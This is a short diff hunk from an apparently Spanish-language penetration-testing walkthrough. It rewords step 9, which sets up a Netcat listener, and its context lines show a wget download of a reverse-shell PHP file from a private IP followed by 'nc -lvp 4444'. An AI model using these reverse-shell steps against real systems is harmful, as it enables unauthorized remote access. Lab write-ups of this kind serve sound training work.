@@ -134,7 +134,7 @@ wget http://192.168.1.9/reverseshell.php
 ```
 ![19](https://user-images.githubusercontent.com/75953873/182731485-6dd80b89-38fe-4aa6-a2c1-de63078be636.png)
 
-- *Paso 9:* Poner a escucha de conexiones con Netcat:
+- *Paso 9:* Poner a escucha conexiones con Netcat:
 ```
 nc -lvp 4444
 ``` 
